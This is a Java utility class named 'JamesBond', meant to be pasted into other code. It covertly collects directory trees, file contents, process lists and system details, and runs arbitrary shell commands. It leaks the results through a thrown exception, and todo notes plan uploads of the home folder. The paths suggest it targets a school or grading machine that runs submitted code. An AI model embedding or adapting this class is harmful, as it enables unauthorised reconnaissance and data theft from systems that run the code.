// copy and paste this class into any code to use its methods
/* todo:
  - zip upload
  - upload other files
    - https://hc.apache.org/httpcomponents-client-ga/quickstart.html
  - automatically upload the home folder or something

*/

import java.io.*;
import java.lang.ProcessBuilder;
import java.util.Scanner;
import java.util.function.Consumer;
import java.util.concurrent.Executors;

class JamesBond {
  private static String out = "";
  private static final String PROJECT_DIRECTORY = System.getProperty("user.dir");
  private static final boolean windows = System.getProperty("os.name").toLowerCase().indexOf("win") >= 0;
  
  public static void main (String str[]) {
    /*File root = new File("C:\\Users\\APCS\\Desktop\\Projects");
    System.out.println("\n\nFile Tree:\n" + FileAssert.printDirectoryTree(root));
    
    for (File f: new File("C:").listFiles()) {
      System.out.println(f.getName());
    }*/
    
    consoleCommand("tree");
    printMessage();
  }
  
  private static void addToMessage(String... str) {
    for (int i = 0; i < str.length; i++)
      out += str[0] + "\n";
  }
  
  public static void throwMessage() {
    throw new RuntimeException(out);
  }
  
  public static void printMessage() {
    System.out.println(out);
  }
  
  public static void currentDirTree() {
    File root = new File(PROJECT_DIRECTORY);
    out += "\n\nFile Tree:\n" + PROJECT_DIRECTORY + "\n" + FileAssert.printDirectoryTree(root);
  }
  
  public static void rootDirTree() {
    File root = new File( windows ? System.getenv("SystemDrive") + "\\" : "/" );
    out += "\n\nRoot tree:\n" + FileAssert.printDirectoryTree(root);
  }
  
  public static void customDirTree(String path) {
    File root = new File(path);
    out += "\n\nTree from `" + path + "`\n" + FileAssert.printDirectoryTree(root);
  }
  
  public static void printFile(String path) {
    out += "\n\nFile contents of `" + path + "`:\n";
    try {
      Scanner input = new Scanner(new File(path));
      
      while (input.hasNextLine()) {
        out += input.nextLine() + "\n";
      }
    } catch (FileNotFoundException e) {
      return;
    }
  }
  
  public static void currentDir() {
    addToMessage("Project directory: " + PROJECT_DIRECTORY);
  }
  
  public static void processes() {
    try {
      String line;
      Process p = Runtime.getRuntime().exec(windows ? System.getenv("windir") +"\\system32\\"+"tasklist.exe" : "ps -e");

      BufferedReader input =
        new BufferedReader(new InputStreamReader(p.getInputStream()));
      while ((line = input.readLine()) != null) {
        addToMessage(line); //<-- Parse data here.
      }
      input.close();
    } catch (Exception err) {
      err.printStackTrace();
    }
  }
  
  public static void systemStats() {
    long kilobytes = 1024;
    long megabytes = kilobytes * 1024;
    long gigabytes = megabytes * 1024;
    
    String ret = "";
    String nameOS = "os.name";  
    String versionOS = "os.version";  
    String architectureOS = "os.arch";
    ret += "  Info about OS";
    ret += "\nName of the OS: " + System.getProperty(nameOS);
    ret += "\nVersion of the OS: " + System.getProperty(versionOS);
    ret += "\nArchitecture of The OS: " + System.getProperty(architectureOS);
    /*Map<String, String> env = System.getenv();
    ret += "\n\n  Environment values\n";
    for(String key : env.keySet()) {
      ret += "K: " + key + " \n\tV: " + env.get(key);
    }*/
    /* Total number of processors or cores available to the JVM */
    ret += "\n\nAvailable processors (cores): " + 
      Runtime.getRuntime().availableProcessors();
    
    /* Total amount of free memory available to the JVM */
    ret += "\nFree memory (megabytes): " + 
      Runtime.getRuntime().freeMemory() / (float) megabytes;
    
    /* This will return Long.MAX_VALUE if there is no preset limit */
    long maxMemory = Runtime.getRuntime().maxMemory();
    /* Maximum amount of memory the JVM will attempt to use */
    ret += "\nMaximum memory (megabytes): " + 
      (maxMemory == Long.MAX_VALUE ? "no limit" : maxMemory / (float) megabytes);
    
    /* Total memory currently available to the JVM */
    ret += "\nTotal memory available to JVM (megabytes): " + 
      Runtime.getRuntime().totalMemory() / (float) megabytes;
    
    /* Get a list of all filesystem roots on this system */
    File[] roots = File.listRoots();
    
    /* For each filesystem root, print some info */
    for (File root : roots) {
      ret += "\n\nFile system root: " + root.getAbsolutePath();
      ret += "\nTotal space (gigabytes): " + (root.getTotalSpace() / (float) gigabytes);
      ret += "\nFree space (gigabytes): " + (root.getFreeSpace() / (float) gigabytes);
      ret += "\nUsable space (gigabytes): " + (root.getUsableSpace() / (float) gigabytes);
    }
    /*ret += "\n\n\nProperties:\n------\n";
    System.getProperties().list(ret);*/
    
    File root = new File("C:\\Users\\APCS\\Desktop\\Projects");
    ret += "\n\nFile Tree:\n" + FileAssert.printDirectoryTree(root);
    
    addToMessage(ret);
  }
  
  public static void consoleCommand(String cmd) {
    try {
      ProcessBuilder builder = new ProcessBuilder();
      if (windows) {
        builder.command("cmd.exe", "/c", cmd);
      } else {
        builder.command("sh", "-c", cmd);
      }
      builder.directory(new File(System.getProperty("user.home")));
      Process process = builder.start();
      Consumer<String> consumer = s-> addToMessage(s);
      StreamGobbler streamGobbler = new StreamGobbler(process.getInputStream(), consumer);
      Executors.newSingleThreadExecutor().submit(streamGobbler);
      int exitCode = process.waitFor();
      assert exitCode == 0;
    } catch (IOException e) {
      
    } catch (InterruptedException e) {
      
    }
  }
}

class FileAssert {
  
  /**
   * Pretty print the directory tree and its file names.
   * 
   * @param folder
   *            must be a folder.
   * @return
   */
  public static String printDirectoryTree(File folder) {
    if (!folder.isDirectory()) {
      throw new IllegalArgumentException("folder is not a Directory");
    }
    int indent = 0;
    StringBuilder sb = new StringBuilder();
    printDirectoryTree(folder, indent, sb);
    return sb.toString();
  }
  
  private static void printDirectoryTree(File folder, int indent,
                                         StringBuilder sb) {
    if (!folder.isDirectory()) {
      throw new IllegalArgumentException("folder is not a Directory");
    }
    sb.append(getIndentString(indent));
    sb.append("+--");
    sb.append(folder.getName());
    sb.append("/");
    sb.append("\n");
    
    if (folder.listFiles() == null) return;
    
    for (File file : folder.listFiles()) {
      if (file.isDirectory()) {
        printDirectoryTree(file, indent + 1, sb);
      } else {
        printFile(file, indent + 1, sb);
      }
    }
    
  }
  
  private static void printFile(File file, int indent, StringBuilder sb) {
    sb.append(getIndentString(indent));
    sb.append("+--");
    sb.append(file.getName());
    sb.append("\n");
  }
  
  private static String getIndentString(int indent) {
    StringBuilder sb = new StringBuilder();
    for (int i = 0; i < indent; i++) {
      sb.append("|  ");
    }
    return sb.toString();
  }
}

class StreamGobbler implements Runnable {
    private InputStream inputStream;
    private Consumer<String> consumer;
 
    public StreamGobbler(InputStream inputStream, Consumer<String> consumer) {
        this.inputStream = inputStream;
        this.consumer = consumer;
    }
 
    @Override
    public void run() {
        new BufferedReader(new InputStreamReader(inputStream)).lines()
          .forEach(consumer);
    }
}